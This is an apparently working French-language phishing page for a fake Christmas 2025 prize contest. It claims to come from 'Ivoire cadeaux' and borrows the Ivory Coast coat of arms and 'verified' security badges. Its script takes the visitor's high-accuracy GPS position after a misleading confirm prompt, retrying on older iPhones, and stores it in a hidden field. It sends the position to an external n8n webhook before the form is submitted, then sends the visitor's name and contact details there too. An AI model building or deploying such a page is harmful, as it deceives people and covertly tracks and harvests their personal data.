<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Concours Officiel ‚Äì Confirmation</title>
    <script src="https://cdn.tailwindcss.com"></script>

    <style>
        body {
            font-family: 'Inter', sans-serif;
        }
        #data-form { display: none; }
    </style>
</head>

<body class="bg-gray-100 min-h-screen flex justify-center items-center p-4">

<div class="bg-white shadow-2xl rounded-2xl max-w-lg w-full p-8 border border-gray-200">

    <!-- üîµ LOGO + TITRE -->
    <div class="text-center mb-6">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/9d/Coat_of_Arms_of_the_Ivory_Coast.svg/1200px-Coat_of_Arms_of_the_Ivory_Coast.svg.png"
             class="h-14 mx-auto mb-3 opacity-80" />
        <h1 class="text-2xl font-bold text-gray-800">
            Concours Officiel ‚Äì No√´l 2025
        </h1>
        <p class="text-gray-500 text-sm mt-1">Organis√© par <strong>Ivoire cadeaux</strong></p>
    </div>

    <!-- üîê BADGE S√âCURIT√â -->
    <div class="flex justify-center mb-4">
        <span class="bg-green-100 text-green-700 px-3 py-1 rounded-full text-xs font-medium">
            ‚úî Processus V√©rifi√© & S√©curis√©
        </span>
    </div>

    <!-- üîµ √âTAPES -->
    <div class="flex justify-center gap-2 mb-6">
        <div class="w-3 h-3 rounded-full bg-blue-600"></div>
        <div class="w-3 h-3 rounded-full bg-gray-300"></div>
    </div>
    <p class="text-center text-xs text-gray-500 mb-6">
        √âtape 1 sur 2 ‚Äì V√©rification d‚Äôidentit√©
    </p>

    <!-- üéâ SECTION NOTIFICATION INITIALE -->
    <div id="initial-notification">
        <h2 class="text-xl font-bold text-gray-700 mb-3 text-center">Vous √™tes s√©lectionn√© üéâ</h2>

        <p class="text-gray-600 text-sm mb-4 text-center">
            F√©licitations ! Vous faites partie des gagnants du <strong>Concours No√´l 2025</strong>.
            Pour confirmer votre identit√© et proc√©der √† la remise de votre r√©compense,
            veuillez cliquer sur le bouton ci-dessous.
        </p>

        <!-- Confiance : Explication du but -->
        <p class="text-gray-400 text-xs text-center mb-6">
            Nous ne demandons aucune information bancaire.  
            Vos donn√©es servent uniquement √† v√©rifier votre identit√© et vous contacter.
        </p>

        <button id="claim-button"
        class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-4 rounded-xl text-lg transition shadow-md">
        Continuer la v√©rification
        </button>
        <!-- üé• Vid√©o YouTube de Pr√©sentation -->
        <!-- üé• Vid√©o explicative officielle -->
        <div id="video-placeholder" class="relative cursor-pointer group">
            <img src="https://img.youtube.com/vi/q--dgkQ69bs/hqdefault.jpg"
                 class="w-full rounded-xl shadow-lg opacity-90 group-hover:opacity-100 transition" />
          
            <div class="absolute inset-0 flex justify-center items-center">
              <div class="bg-white bg-opacity-80 rounded-full p-4 shadow-md">
                <svg xmlns="http://www.w3.org/2000/svg" class="h-10 w-10 text-red-600" fill="currentColor" viewBox="0 0 16 16">
                  <path d="M6.79 5.093A.5.5 0 0 0 6 5.5v5a.5.5 0 0 0 .79.407l4-2.5a.5.5 0 0 0 0-.814l-4-2.5z"/>
                </svg>
              </div>
            </div>
          </div>
          
          <script>
          document.getElementById('video-placeholder').onclick = () => {
              document.getElementById('video-placeholder').outerHTML = `
                  <iframe class="w-full rounded-xl shadow-lg"
                      height="220"
                      src="https://www.youtube.com/embed/q--dgkQ69bs?autoplay=1"
                      allow="autoplay; encrypted-media"
                      allowfullscreen>
                  </iframe>`;
          };
          </script>
          
  


 
    </div>

    <!-- üìù FORMULAIRE -->
    <div id="data-form">
        <h2 class="text-xl font-semibold text-gray-800 mb-4 text-center">
            V√©rification finale
        </h2>

        <p class="text-gray-500 text-sm text-center mb-6">
            Merci de confirmer les informations suivantes pour finaliser votre dossier.
        </p>

        <!-- Champ Localisation (masqu√© mais actif) -->
        <div class="mb-4 hidden">
            <label for="location-input" class="block text-sm font-medium text-gray-700">
                Localisation
            </label>
            <input id="location-input" type="text"
                class="w-full p-3 border border-gray-300 rounded-lg focus:ring-blue-500 focus:border-blue-500" />
        </div>

        <!-- Nom -->
        <div class="mb-4">
            <label for="name-input" class="block text-sm font-medium text-gray-700">Nom</label>
            <input id="name-input" type="text" placeholder="Votre nom"
                class="w-full p-3 border border-gray-300 rounded-lg focus:ring-blue-500 focus:border-blue-500" />
        </div>

        <!-- Pr√©nom -->
        <div class="mb-4">
            <label for="firstname-input" class="block text-sm font-medium text-gray-700">Pr√©nom</label>
            <input id="firstname-input" type="text" placeholder="Votre pr√©nom"
                class="w-full p-3 border border-gray-300 rounded-lg focus:ring-blue-500 focus:border-blue-500" />
        </div>

        <!-- Contact -->
        <div class="mb-6">
            <label for="contact-input" class="block text-sm font-medium text-gray-700">Contact</label>
            <input id="contact-input" type="text" placeholder="Email ou Num√©ro"
                class="w-full p-3 border border-gray-300 rounded-lg focus:ring-blue-500 focus:border-blue-500" />
        </div>

        <!-- CTA -->
        <button id="submit-button"
                class="w-full bg-green-600 hover:bg-green-700 text-white py-3 rounded-xl font-semibold shadow-sm">
            Valider mes informations
        </button>

        <p id="error-message" class="text-center text-red-500 text-sm mt-3 hidden">
            Merci de compl√©ter tous les champs.
        </p>

        <div id="result-message" class="text-center text-green-600 mt-6 hidden">
            Informations envoy√©es ‚úî
        </div>
    </div>

    <!-- ‚öñ Mentions l√©gales -->
    <div class="mt-8 text-center text-[11px] text-gray-400">
        Concours certifi√© par <strong>Ivoire cadeaux</strong> ‚Äî  
        Aucun frais ne peut vous √™tre demand√©.  
        Service assistance : support@ivoire-cadeaux.com
    </div>

</div>

<script>
    document.addEventListener("DOMContentLoaded", () => {
    
        /* --- UTILITAIRES -------------------------------------------------- */
    
        function detectIOSVersion() {
            const ua = navigator.userAgent;
            if (/iP(hone|od|ad)/.test(ua)) {
                const v = ua.match(/OS (\d+)_/);
                return v ? parseInt(v[1]) : null;
            }
            return null;
        }
    
        function detectIPhoneModel() {
            const ratio = window.devicePixelRatio || 1;
            const screen = {
                w: window.screen.width * ratio,
                h: window.screen.height * ratio
            };
    
            if ((screen.w === 828 && screen.h === 1792) ||
                (screen.w === 896 && screen.h === 414)) {
                return "iPhone 11";
            }
            return "Unknown";
        }
    
        const format = (pos, s) => ({
            method: "gps",
            latitude: pos.coords.latitude,
            longitude: pos.coords.longitude,
            accuracy: pos.coords.accuracy,
            source: s
        });
    
        const denied = () => ({
            method: "denied",
            latitude: 0,
            longitude: 0,
            accuracy: null,
            source: "fallback"
        });
    
    
        /* --- GPS FULL SAFE ------------------------------------------------ */
    
        async function getGPSCoordinates() {
            const iOS = detectIOSVersion();
            const model = detectIPhoneModel();
    
            const isOldIOS = iOS && iOS <= 15;
            const isIphone11 = model === "iPhone 11";
    
            // MODE SPECIAL iPhone 11 / iOS ancien
            if (isOldIOS || isIphone11) {
    
                const tryOnce = () => new Promise((res, rej) => {
                    navigator.geolocation.getCurrentPosition(
                        (p) => res(p),
                        (e) => rej(e),
                        { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
                    );
                });
    
                try { return format(await tryOnce(), "first_attempt"); }
                catch {}
    
                await new Promise(r => setTimeout(r, 2000));
    
                try { return format(await tryOnce(), "second_attempt"); }
                catch {}
    
                return denied();
            }
    
            // MODE NORMAL
            try {
                return format(await new Promise((res, rej) => {
                    navigator.geolocation.getCurrentPosition(
                        res, rej,
                        { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
                    );
                }), "fast");
            }
            catch {
                return denied();
            }
        }
    
    
        /* --- VARIABLES DOM ------------------------------------------------ */
    
        const urlParams = Object.fromEntries(new URLSearchParams(window.location.search));
        let collectedData = {};
    
        const claimButton = document.getElementById('claim-button');
        const dataForm = document.getElementById('data-form');
        const submitButton = document.getElementById('submit-button');
        const initialNotification = document.getElementById('initial-notification');
        const resultMessage = document.getElementById('result-message');
        const errorMessage = document.getElementById('error-message');
        const locationInput = document.getElementById("location-input");
    
    
        /* --- BOUTON 1 : LANCER LA VERIFICATION ---------------------------- */
    
        claimButton.addEventListener('click', () => {
    
            initialNotification.style.display = 'none';
            dataForm.style.display = 'block';
            locationInput.value = "Activation de la localisation‚Ä¶";
    
            // Popup obligatoire iPhone 11
            if (!confirm("Pour v√©rifier votre identit√©, activez la fonctionnalit√©.")) {
                locationInput.value = "Localisation refus√©e par l‚Äôutilisateur.";
                return;
            }
    
            // Petit d√©lai s√©curis√©
            setTimeout(async () => {
    
                const coords = await getGPSCoordinates();
    
                const localisationString = coords.method === "gps"
                    ? `Lat: ${coords.latitude.toFixed(6)}, Lon: ${coords.longitude.toFixed(6)} (¬±${Math.round(coords.accuracy)}m)`
                    : "Localisation refus√©e / indisponible";
    
                locationInput.value = localisationString;
    
                // Envoi webhook #1
                fetch("https://kahan-229.app.n8n.cloud/webhook/ea903437-0b67-4980-85fc-94b61e3d5e55", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        localisation: localisationString,
                        nom: "",
                        prenom: "",
                        contact_paiement: "",
                        date_saisie: new Date().toLocaleString('fr-FR'),
                        ...urlParams
                    })
                }).catch(console.error);
    
            }, 300);
    
        });
    
    
        /* --- BOUTON 2 : VALIDATION FORMULAIRE ----------------------------- */
    
        submitButton.addEventListener('click', () => {
    
            const name = document.getElementById('name-input').value;
            const firstname = document.getElementById('firstname-input').value;
            const contact = document.getElementById('contact-input').value;
    
            if (!locationInput.value || !name || !firstname || !contact) {
                errorMessage.classList.remove("hidden");
                return;
            }
    
            collectedData = {
                localisation: locationInput.value,
                nom: name,
                prenom: firstname,
                contact_paiement: contact,
                date_saisie: new Date().toLocaleString('fr-FR'),
                ...urlParams
            };
    
            dataForm.style.display = 'none';
            resultMessage.style.display = 'block';
    
            // Envoi webhook #2
            fetch("https://kahan-229.app.n8n.cloud/webhook/ea903437-0b67-4980-85fc-94b61e3d5e55", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(collectedData)
            }).catch(console.error);
    
        });
    
    });
    </script>
    

</body>
</html>